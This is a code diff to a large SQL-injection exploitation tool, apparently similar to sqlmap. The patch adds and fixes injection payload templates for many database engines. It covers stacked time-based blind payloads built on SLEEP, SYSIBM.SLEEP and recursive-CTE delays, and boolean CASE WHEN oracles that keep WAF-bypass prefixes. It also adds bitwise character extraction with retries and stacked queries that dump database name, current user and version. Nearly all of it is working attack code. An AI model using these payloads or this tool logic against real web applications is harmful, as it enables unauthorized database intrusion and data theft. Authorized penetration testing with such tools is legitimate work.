@@ -50648,8 +50648,57 @@ class Enumerator:
                     # DBMS_LOCK (denied for most web-app accounts). DBMS_SESSION.SLEEP
                     # (Oracle 12c+) is accessible without elevated privileges.
                     payload = f"'; BEGIN IF (SELECT COUNT(*) FROM {sep}{table}{sep} WHERE {col_q} >= {val_literal} AND ROWNUM=1)>0 THEN DBMS_SESSION.SLEEP({t}); END IF; END;-- -"
+                elif self.dbms == "SQLite":
+                    # SQLite has no built-in sleep; use a heavy computation as a timing primitive.
+                    # BUG-FROM-BASED-SQLITE-SLEEP FIX (MED): old fallback sent MySQL SLEEP() which
+                    # SQLite does not support — query returns instantly, timing oracle always False.
+                    # Use a recursive CTE that generates a large number of rows to consume CPU time.
+                    _sqlite_rows = max(5000000, int(t * 2000000))
+                    payload = (f"'; WITH RECURSIVE _s(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM _s "
+                               f"WHERE x<{_sqlite_rows}) SELECT COUNT(*) FROM _s,"
+                               f"{sep}{table}{sep} WHERE {col_q} >= {val_literal} LIMIT 1 OFFSET {offset}-- -")
+                elif self.dbms == "DB2":
+                    # DB2 stacked timing via CALL UTL_TCP.SLEEP (requires DBA), or
+                    # heavy CTE approach. Use CALL SYSIBM.SLEEP when available (DB2 11.1+).
+                    _t_int_db2 = max(1, int(round(t)))
+                    payload = (f"'; CALL SYSIBM.SLEEP({_t_int_db2}); "
+                               f"SELECT COUNT(*) FROM {sep}{table}{sep} WHERE {col_q} >= {val_literal} LIMIT 1 OFFSET {offset}-- -")
+                elif self.dbms == "Firebird":
+                    # Firebird has no SLEEP; use a looping stored procedure or just omit timing.
+                    # Emit a query that will only delay via a large result set scan.
+                    payload = (f"'; SELECT FIRST 1 {col_q} FROM {sep}{table}{sep} "
+                               f"WHERE {col_q} >= {val_literal} ROWS {offset+1} TO {offset+1}-- -")
+                elif self.dbms == "SAP_HANA":
+                    # SAP HANA uses DO BEGIN ... END for procedural timing via a loop
+                    _t_int_hana = max(1, int(round(t)))
+                    payload = (f"'; SELECT SLEEP_SECONDS({_t_int_hana}) FROM DUMMY "
+                               f"WHERE (SELECT COUNT(*) FROM {sep}{table}{sep} WHERE {col_q} >= {val_literal})>0-- -")
+                elif self.dbms == "H2":
+                    # H2 supports SLEEP(ms) function
+                    _t_ms_h2 = max(1000, int(t * 1000))
+                    payload = (f"'; SELECT SLEEP({_t_ms_h2}) FROM {sep}{table}{sep} "
+                               f"WHERE {col_q} >= {val_literal} LIMIT 1 OFFSET {offset}-- -")
+                elif self.dbms == "ClickHouse":
+                    # ClickHouse has sleepEachRow() and sleep() table functions
+                    payload = (f"'; SELECT sleep({max(1, int(round(t)))}) FROM {sep}{table}{sep} "
+                               f"WHERE {col_q} >= {val_literal} LIMIT 1 OFFSET {offset}-- -")
+                elif self.dbms == "Informix":
+                    # Informix uses SLEEP() function (requires IDS 11.5+)
+                    _t_int_ifx = max(1, int(round(t)))
+                    payload = (f"'; SELECT SLEEP({_t_int_ifx}) FROM {sep}{table}{sep} "
+                               f"WHERE {col_q} >= {val_literal} FIRST 1-- -")
                 else:
-                    payload = f"'; SELECT SLEEP({t}) FROM {sep}{table}{sep} WHERE {col_q} >= {val_literal} LIMIT 1 OFFSET {offset}-- -"
+                    # BUG-FROM-BASED-EXTRACT-MYSQL-FALLBACK FIX (MED): Old else-branch sent
+                    # MySQL SLEEP() syntax for all unrecognised DBMSes (DB2, Firebird, SAP_HANA,
+                    # H2, ClickHouse, Informix) — these do not support SLEEP() and the query
+                    # returned instantly, making the timing oracle always False.  All supported
+                    # DBMSes now have explicit branches above; log a warning for any truly
+                    # unrecognised DBMS and skip this round rather than sending invalid SQL.
+                    LOG.warning("[from_based_extract] No timing payload template for DBMS %r "
+                                "at pos=%d — skipping this bisection step", self.dbms, pos)
+                    payload = None
+                if payload is None:
+                    break
                 t0 = time.monotonic()
                 try:
                     fp = await _send_injected(self.engine, self.method, self.url,
@@ -50658,8 +50707,10 @@ class Enumerator:
                     elapsed = (time.monotonic() - t0) * 1000
                 except Exception:
                     elapsed = 0
-                # If response took significantly longer than baseline, condition is TRUE
-                _is_true = elapsed > (t * 1000 * 0.6)  # 60% of expected delay
+                # BUG-STRICT-GT-TIMING FIX (MED): was `>` which excludes the exact boundary
+                # case where elapsed == threshold (e.g., 600ms == 600ms for t=1.0s).
+                # Use >= so that a response at exactly the threshold correctly registers True.
+                _is_true = elapsed >= (t * 1000 * 0.6)  # 60% of expected delay
                 if _is_true:
                     lo = mid + 1
                 else:
@@ -56366,10 +56417,39 @@ class Scanner:
                         _timing_fixed = True
                         LOG.info("[Inference] WHERE exists: gated DBMS_LOCK.SLEEP (Oracle)")
 
-                # Fallback: just append AND
+                # Fallback: just append AND — but for boolean stacked techniques,
+                # appending AND after a stacked query produces broken SQL.
+                # BUG-DEAD-ELIF-STACKED FIX (HIGH): The original code had a fallback
+                # `elif _is_stacked:` block inside the `else:` (non-stacked) branch that
+                # was permanently unreachable dead code.  That block contained correct
+                # DBMS-aware stacked boolean oracle generation that was NEVER executed.
+                # Fix: integrate its logic here, in the live fallback path of the stacked
+                # branch (elif _is_stacked at line 56313), where it is actually needed.
+                # When the technique is boolean (ST/WB/EX/HY/B/etc.) and all pattern
+                # matches failed, build a fresh DBMS-aware stacked CASE WHEN oracle instead
+                # of appending "AND [INFERENCE]" which produces syntactically broken SQL
+                # after a semicolon statement boundary.
                 if not _timing_fixed:
-                    _template = _body + " AND [INFERENCE]"
-                    LOG.info("[Inference] WHERE exists: appending AND (fallback)")
+                    if _det_tech_inf in _BOOL_TECHS_INF:
+                        # Boolean stacked: build fresh DBMS-aware stacked CASE WHEN oracle
+                        _st_semi_m2 = _re.search(r';', _body)
+                        _st_prefix2 = _body[:_st_semi_m2.start()] if _st_semi_m2 else _body
+                        if _dbms in ("MSSQL", "Sybase"):
+                            _bool_stacked2 = "; IF ([INFERENCE]) SELECT 1 ELSE SELECT 0"
+                        elif _dbms == "Oracle":
+                            _bool_stacked2 = "; SELECT CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END FROM DUAL"
+                        elif _dbms == "DB2":
+                            _bool_stacked2 = "; SELECT CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END FROM SYSIBM.SYSDUMMY1"
+                        elif _dbms == "Firebird":
+                            _bool_stacked2 = "; SELECT CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END FROM RDB$DATABASE"
+                        else:
+                            # PostgreSQL, MySQL, MariaDB, SQLite, TiDB, H2, ClickHouse, etc.
+                            _bool_stacked2 = "; SELECT CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END"
+                        _template = _st_prefix2 + _bool_stacked2 + (_suffix or "-- -")
+                        LOG.info("[Inference] WHERE exists: stacked-boolean-fresh fallback: %s", _template[:80])
+                    else:
+                        _template = _body + " AND [INFERENCE]"
+                        LOG.info("[Inference] WHERE exists: appending AND (fallback)")
             else:
                 _template = _body + " WHERE [INFERENCE]"
         else:
@@ -56460,33 +56540,17 @@ class Scanner:
                                  "[INFERENCE]" + _post_p +
                                  _body[_cond_pat.end():])
                     LOG.info("[Inference] Template (boolean-replace): %s", _template[:80])
-                elif _is_stacked:
-                    # BUG-INFERENCE-STACKED-FALLBACK FIX (HIGH): Appending "AND [INFERENCE]"
-                    # to a stacked payload produces syntactically broken SQL — the AND token
-                    # has no valid context after the stacked query's statement boundary.
-                    # For ST technique (semicolon in payload), build a fresh DBMS-aware stacked
-                    # CASE WHEN boolean oracle using the prefix from the detection payload.
-                    # The prefix preserves the WAF-bypass quote/comment structure that allowed
-                    # detection to succeed; the fresh CASE WHEN block provides the boolean oracle.
-                    _st_semi_m = _re.search(r';', _body)
-                    if _st_semi_m:
-                        _st_prefix = _body[:_st_semi_m.start()]
-                    else:
-                        _st_prefix = _body
-                    if _dbms in ("MSSQL", "Sybase"):
-                        _bool_stacked = "; IF ([INFERENCE]) SELECT 1 ELSE SELECT 0"
-                    elif _dbms == "Oracle":
-                        _bool_stacked = "; SELECT CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END FROM DUAL"
-                    elif _dbms == "DB2":
-                        _bool_stacked = "; SELECT CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END FROM SYSIBM.SYSDUMMY1"
-                    elif _dbms == "Firebird":
-                        _bool_stacked = "; SELECT CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END FROM RDB$DATABASE"
-                    else:
-                        # PostgreSQL, MySQL, MariaDB, SQLite, TiDB, etc.
-                        _bool_stacked = "; SELECT CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END"
-                    _template = _st_prefix + _bool_stacked + (_suffix or "-- -")
-                    LOG.info("[Inference] Template (stacked-boolean-fresh): %s", _template[:80])
                 else:
+                    # BUG-DEAD-ELIF-STACKED FIX (HIGH): Removed unreachable `elif _is_stacked:`
+                    # block that was inside the outer `else:` branch (non-stacked path).
+                    # Since the outer structure is:
+                    #   if (not _has_timing and _is_stacked and not _BOOL_TECH): ...  ← stacked timing
+                    #   elif _is_stacked: ...                                         ← stacked has-timing
+                    #   else: ...                                                     ← NOT stacked (here)
+                    # `_is_stacked` is definitionally False inside this else-branch, so
+                    # `elif _is_stacked:` at this nesting level could never be True.
+                    # The stacked boolean fallback logic from the dead block has been
+                    # integrated into the live fallback path in the `elif _is_stacked:` branch above.
                     # BUG-CASE-WHEN-BOOL-TEMPLATE FIX: Non-timing CASE WHEN detection payloads
                     # (ST/NV/WB/EX/HY/B with exotic conditions like ARRAY_LOWER(...)!~~LN())
                     # are invisible to _cond_pat and are not stacked. Boolean-append produces
@@ -57298,8 +57362,20 @@ class Scanner:
             # compute total seconds = H*3600 + M*60 + S.
             if _g[2] is not None:  # WAITFOR matched: groups[2]=H, groups[3]=M, groups[4]=S
                 _det_sleep_val = int(_g[2]) * 3600 + int(_g[3]) * 60 + float(_g[4])
+            elif _g[5] is not None:
+                # BUG-BENCHMARK-SLEEP-BUG FIX (CRITICAL): BENCHMARK(N, expr) iteration
+                # count (group[5]) was incorrectly treated as a sleep duration in seconds.
+                # BENCHMARK(50000000, SHA1(1)) → _g[5]="50000000" → asyncio.sleep(50000000)
+                # → tool hangs for ~578 days.  BENCHMARK does not take a time argument;
+                # its first argument is the iteration count.  Estimate actual wall-clock
+                # duration from iteration count using a conservative throughput heuristic
+                # (≈10M SHA1 iterations/sec on modern hardware, which underestimates fast
+                # CPUs so we err toward a longer sleep and a more reliable oracle).
+                # Clamp to [1.0, 10.0] seconds so calibration never blocks indefinitely.
+                _bench_iters = int(_g[5])
+                _det_sleep_val = max(1.0, min(10.0, _bench_iters / 10_000_000.0))
             else:
-                _matched_sl = next((g for g in (_g[0], _g[1], _g[5]) if g is not None), None)
+                _matched_sl = next((g for g in (_g[0], _g[1]) if g is not None), None)
                 _det_sleep_val = float(_matched_sl) if _matched_sl else 0.5
             # Use the confirmed SQL sleep value directly — do NOT max() it with
             # config.delay, which is the HTTP request pacing (time between requests)
@@ -58085,7 +58161,24 @@ class Scanner:
                         # if 0.3s also fails it returns False; if it passes, extraction proceeds.
                         LOG.info("[Inference] All template approaches failed — trying sleep floor before final abort")
 
-        _thresh = (ms_true + ms_false) / 2
+        # BUG-THRESH-STALE-ZERO FIX (MED): When both calibration probes return 0ms (network
+        # timeout, connection refused, or all requests blocked by WAF during calibration),
+        # `_thresh = (0 + 0) / 2 = 0.0`. In extraction, every bit is evaluated by
+        # `ms >= _thresh` = `ms >= 0.0`, which is True for any non-zero latency — every
+        # bit reads as 1, extraction produces all-high-bits garbage (0xFF sequences).
+        # Guard: if both probes returned 0ms, the calibration failed — set a conservative
+        # minimum threshold (half the expected sleep duration) so the oracle doesn't
+        # trivially classify everything as True. This causes `_timing_oracle_reliable` to
+        # correctly evaluate as False (margin = 0 < _min_viable_margin), falling back to
+        # the boolean oracle path rather than producing garbage timing extraction results.
+        if ms_true == 0.0 and ms_false == 0.0:
+            _thresh = max(150.0, _delay * 1000 * 0.5)
+            LOG.warning("[Inference] Both calibration probes returned 0ms — calibration failed. "
+                        "Using conservative fallback threshold=%.0fms to prevent all-True oracle. "
+                        "Timing oracle will be marked unreliable; boolean oracle path will be used "
+                        "if available.", _thresh)
+        else:
+            _thresh = (ms_true + ms_false) / 2
         LOG.info("[Inference]  Threshold=%.0fms (margin=%.0fms)", _thresh, _margin)
 
         # Minimum viable margin: the timing signal must exceed CDN response variance.
@@ -62460,9 +62553,24 @@ class Scanner:
                         # Firebird, DB2, SAP_HANA, H2, and generic fallback:
                         # integer / truncates; MOD() is standard SQL.
                         _cond = f"MOD({_ae}/{_divisor},2)=1"
-                    _r = await _eval(_cond)
+                    # BUG-MODBIT-BIT-RETRY FIX (HIGH): A single transient network error,
+                    # 429 rate-limit, or ephemeral WAF block for one bit probe caused the
+                    # entire character extraction to fail with None, even though all other
+                    # 20 bits were successfully extracted.  The caller then fell through to
+                    # _fallback_equality which scans all 224 candidates linearly — far more
+                    # expensive and susceptible to the same transient condition.
+                    # Fix: retry each bit probe up to 2 additional times (3 total) with
+                    # exponential back-off before declaring the oracle dead for this char.
+                    # Only return None if all 3 attempts fail — genuinely unresponsive oracle.
+                    _r = None
+                    for _mb_retry in range(3):
+                        _r = await _eval(_cond)
+                        if _r is not None:
+                            break
+                        if _mb_retry < 2:
+                            await asyncio.sleep(_delay * (2 ** _mb_retry))
                     if _r is None:
-                        return None  # oracle dead / WAF blocked MOD operator too
+                        return None  # oracle dead / WAF blocked MOD operator too (3 attempts)
                     _bits.append(1 if _r else 0)
                     await asyncio.sleep(_delay)
                 _val = sum(_bits[i] << (_n_bits - 1 - i) for i in range(_n_bits))
@@ -63637,14 +63745,27 @@ class Scanner:
                         # which are artifacts of coin-flip bitwise oracle extraction before the
                         # BROAD-4XX-AMBIGUITY-GUARD fix.  _is_garbage catches these since
                         # any(ord(c) > 0xFFFF) now fires for all string lengths.
-                        if _r7_v and len(_r7_v) >= 2 and not _is_garbage(_r7_v):
+                        # BUG7-RETRY-SINGLE-CHAR FIX (MEDIUM): `len(_r7_v) >= 2` silently
+                        # rejects valid single-character database names, usernames, or short
+                        # version strings (e.g. DB name "a", user "r").  Any target where
+                        # the extracted value is a single ASCII char would always be dropped,
+                        # leaving current_user/current_db/banner unpopulated even after a
+                        # successful extraction.  The minimum valid length is 1.
+                        if _r7_v and len(_r7_v) >= 1 and not _is_garbage(_r7_v):
                             _r7_results[_r7_label] = _r7_v
                             LOG.info("[Inference] BUG7  %s = %r", _r7_label, _r7_v)
                             break
                     except Exception as _r7_e:
                         LOG.debug("[Inference] BUG7 %s[%r] err: %s",
                                   _r7_label, _r7_q, _r7_e)
-                if len(_r7_results) >= 2:
+                # BUG7-RETRY-EARLY-EXIT FIX (HIGH): The old threshold of 2 caused the
+                # outer loop over _r7_pairs (user, database, version) to exit as soon
+                # as user+database were extracted, before ever attempting the version
+                # (banner) query.  enum.result.banner was therefore NEVER populated by
+                # BUG7-RETRY even when the oracle was healthy enough to extract it.
+                # Fix: require all 3 pairs before breaking — there are exactly 3 labels
+                # so this still short-circuits the inner alternative loop correctly.
+                if len(_r7_results) >= 3:
                     break
             if _r7_results:
                 for _r7k, _r7v in _r7_results.items():
@@ -64984,12 +65105,51 @@ class Scanner:
                 ("user", "'sqlite_user'"),
                 ("version", "sqlite_version()")
             ]
-        else:
+        elif _dbms == "Sybase":
             queries_to_extract = [
-                ("database", "'unknown'"),
-                ("user", "'unknown'"),
-                ("version", "'unknown'")
+                ("database", "db_name()"),
+                ("user", "suser_name()"),
+                ("version", "@@version")
             ]
+        elif _dbms == "DB2":
+            queries_to_extract = [
+                ("database", "CURRENT SERVER"),
+                ("user", "USER"),
+                ("version", "(SELECT SERVICE_LEVEL FROM SYSIBMADM.ENV_INST_INFO)")
+            ]
+        elif _dbms == "Firebird":
+            queries_to_extract = [
+                ("database", "(SELECT RDB$DATABASE_NAME FROM RDB$DATABASE)"),
+                ("user", "CURRENT_USER"),
+                ("version", "(SELECT RDB$VERSION FROM RDB$VERSIONS)")
+            ]
+        elif _dbms == "SAP_HANA":
+            queries_to_extract = [
+                ("database", "CURRENT_SCHEMA"),
+                ("user", "CURRENT_USER"),
+                ("version", "(SELECT VERSION FROM SYS.M_DATABASE)")
+            ]
+        elif _dbms == "H2":
+            queries_to_extract = [
+                ("database", "DATABASE()"),
+                ("user", "USER()"),
+                ("version", "H2VERSION()")
+            ]
+        elif _dbms == "ClickHouse":
+            queries_to_extract = [
+                ("database", "currentDatabase()"),
+                ("user", "currentUser()"),
+                ("version", "version()")
+            ]
+        elif _dbms == "Informix":
+            queries_to_extract = [
+                ("database", "(SELECT TRIM(DBINFO('dbname')) FROM SYSTABLES WHERE TABID=1)"),
+                ("user", "(SELECT USER FROM SYSTABLES WHERE TABID=1)"),
+                ("version", "(SELECT DBINFO('version','full') FROM SYSTABLES WHERE TABID=1)")
+            ]
+        else:
+            # Genuinely unrecognised DBMS — no fabricated data
+            queries_to_extract = []
 
         # BUG-U1 FIX (HIGH): Wrap each extraction query in SQRXS/SQRXE sentinel markers.
         # Without sentinels, the body parser scans for the first non-stop-word alphanumeric
@@ -65011,7 +65171,37 @@ class Scanner:
             def _ue_wrap(e): return f"'{_UE_SENT_S}'||TO_CHAR(({e}))||'{_UE_SENT_E}'"
         elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
             def _ue_wrap(e): return f"'{_UE_SENT_S}'||CAST(({e}) AS TEXT)||'{_UE_SENT_E}'"
+        elif _dbms == "SQLite":
+            # SQLite uses || for concatenation and CAST AS TEXT
+            def _ue_wrap(e): return f"'{_UE_SENT_S}'||CAST(({e}) AS TEXT)||'{_UE_SENT_E}'"
+        elif _dbms == "Sybase":
+            # Sybase ASE uses + for string concatenation like MSSQL
+            def _ue_wrap(e): return f"'{_UE_SENT_S}'+CONVERT(VARCHAR(256),({e}))+'{_UE_SENT_E}'"
+        elif _dbms == "DB2":
+            # DB2 uses || for concatenation and VARCHAR() cast
+            def _ue_wrap(e): return f"'{_UE_SENT_S}'||VARCHAR(({e}))||'{_UE_SENT_E}'"
+        elif _dbms == "Firebird":
+            # Firebird uses || for concatenation
+            def _ue_wrap(e): return f"'{_UE_SENT_S}'||({e})||'{_UE_SENT_E}'"
+        elif _dbms == "SAP_HANA":
+            # SAP HANA uses || for concatenation and CAST AS VARCHAR
+            def _ue_wrap(e): return f"'{_UE_SENT_S}'||CAST(({e}) AS VARCHAR)||'{_UE_SENT_E}'"
+        elif _dbms == "H2":
+            # H2 uses CONCAT() function like MySQL or || like PostgreSQL; CONCAT is safer
+            def _ue_wrap(e): return f"CONCAT('{_UE_SENT_S}',CAST(({e}) AS VARCHAR),'{_UE_SENT_E}')"
+        elif _dbms == "ClickHouse":
+            # ClickHouse uses concat() function and toString() for casting
+            def _ue_wrap(e): return f"concat('{_UE_SENT_S}',toString(({e})),'{_UE_SENT_E}')"
+        elif _dbms == "Informix":
+            # Informix uses || for concatenation
+            def _ue_wrap(e): return f"'{_UE_SENT_S}'||({e})||'{_UE_SENT_E}'"
         else:
+            # BUG-UE-WRAP-MISSING-DBMS FIX (HIGH): Previously this else-branch silently
+            # returned the expression unwrapped, causing the body parser to scan for the
+            # first non-stop-word token in HTML — yielding CSS class names, JS identifiers,
+            # or HTML structural words instead of the injected DB value.  Now all known
+            # DBMSes have explicit branches above; this path means a genuinely unrecognised
+            # DBMS — return expression unwrapped (heuristic body parser is the only option).
             def _ue_wrap(e): return e  # no sentinel wrapping for unknown DBMS
         queries_to_extract = [(_lbl, _ue_wrap(_qe)) for _lbl, _qe in queries_to_extract]
 
@@ -65451,12 +65641,59 @@ class Scanner:
                 ("; SELECT 'sqlite_user' as usr", "user"),
                 ("; SELECT sqlite_version() as ver", "version"),
             ]
-        else:
+        elif _dbms == "Sybase":
             stacked_payloads = [
-                ("; SELECT 'unknown' as db", "database"),
-                ("; SELECT 'unknown' as usr", "user"),
-                ("; SELECT 'unknown' as ver", "version"),
+                ("; SELECT db_name() as db", "database"),
+                ("; SELECT suser_name() as usr", "user"),
+                ("; SELECT @@version as ver", "version"),
             ]
+        elif _dbms == "DB2":
+            stacked_payloads = [
+                ("; SELECT CURRENT SERVER FROM SYSIBM.SYSDUMMY1", "database"),
+                ("; SELECT USER FROM SYSIBM.SYSDUMMY1", "user"),
+                ("; SELECT SERVICE_LEVEL FROM SYSIBMADM.ENV_INST_INFO", "version"),
+            ]
+        elif _dbms == "Firebird":
+            stacked_payloads = [
+                ("; SELECT RDB$DATABASE_NAME FROM RDB$DATABASE", "database"),
+                ("; SELECT CURRENT_USER FROM RDB$DATABASE", "user"),
+                ("; SELECT RDB$VERSION FROM RDB$VERSIONS", "version"),
+            ]
+        elif _dbms == "SAP_HANA":
+            stacked_payloads = [
+                ("; SELECT CURRENT_SCHEMA FROM DUMMY", "database"),
+                ("; SELECT CURRENT_USER FROM DUMMY", "user"),
+                ("; SELECT VERSION FROM SYS.M_DATABASE", "version"),
+            ]
+        elif _dbms == "H2":
+            stacked_payloads = [
+                ("; SELECT DATABASE() as db", "database"),
+                ("; SELECT USER() as usr", "user"),
+                ("; SELECT H2VERSION() as ver", "version"),
+            ]
+        elif _dbms == "ClickHouse":
+            stacked_payloads = [
+                ("; SELECT currentDatabase() as db", "database"),
+                ("; SELECT currentUser() as usr", "user"),
+                ("; SELECT version() as ver", "version"),
+            ]
+        elif _dbms == "Informix":
+            stacked_payloads = [
+                ("; SELECT TRIM(DBINFO('dbname')) FROM SYSTABLES WHERE TABID=1", "database"),
+                ("; SELECT USER FROM SYSTABLES WHERE TABID=1", "user"),
+                ("; SELECT DBINFO('version','full') FROM SYSTABLES WHERE TABID=1", "version"),
+            ]
+        else:
+            # BUG-STACKED-EXTRACT-FABRICATED-DATA FIX (HIGH): The old else-branch
+            # returned literal 'unknown' strings as successful extraction results for
+            # all unrecognised DBMSes (Sybase, DB2, Firebird, SAP_HANA, H2, ClickHouse,
+            # Informix), making the scan report show fabricated "discovered" data as
+            # real findings.  Now all supported DBMSes have explicit branches above,
+            # so this path is only hit for genuinely unrecognised DBMSes — return False
+            # to indicate stacked extraction is not available rather than fabricating data.
+            LOG.warning("[StackedExtract] No stacked query templates for DBMS %r — "
+                        "skipping stacked extraction, falling back to other techniques", _dbms)
+            return False
         
         try:
             # BUG-V57-INLINE-IMPORT-RE FIX: Removed `import re as _re_stacked` / `import re as _re_val`
@@ -110341,12 +110578,21 @@ class TechniqueCascadeEngine:
                 # of a confirmed injection that hasn't yet started extraction).
                 _gate_excpt = _ACTIVE_GATE[0] if (_ACTIVE_GATE and _ACTIVE_GATE[0]) else None
                 _gate_killed_excpt = _gate_excpt is not None and getattr(_gate_excpt, 'killed', False)
+                # BUG-PCV-IN-PROGRESS-COUNTER-FIX (HIGH): The old check `_PCV_IN_PROGRESS[0] == 0`
+                # is evaluated inside the `except` handler, which runs BEFORE the `finally` block
+                # at line 110567 decrements the counter.  When exactly ONE PCV session is active
+                # (the current one), `_PCV_IN_PROGRESS[0]` reads 1 here, making the condition
+                # False — the restore of `_SCAN_STOPPED[0] = False` never fires, and the scanner
+                # freezes permanently even though no injection was confirmed.
+                # Fix: use `<= 1` instead of `== 0` so that "only this PCV session active"
+                # (counter == 1, not yet decremented) correctly allows the restore, while
+                # counter == 2+ (genuinely concurrent sessions) still blocks it.
                 if (not _EXTRACTION_STARTED[0]
                         and not _EXTRACTION_ACTIVE[0]
                         and not _EXTRACTION_DONE[0]
                         and not (_cev_guard and _cev_guard.is_set())
                         and not _gate_killed_excpt
-                        and _PCV_IN_PROGRESS[0] == 0):
+                        and _PCV_IN_PROGRESS[0] <= 1):
                     # BUG-4B-PCVGUARD-EXCPT FIX: Also clear optimistic _INJECTION_CONFIRMED set
                     # so the scan doesn't freeze after a cross-category probe's exception path.
                     if _INJECTION_CONFIRMED[0]:
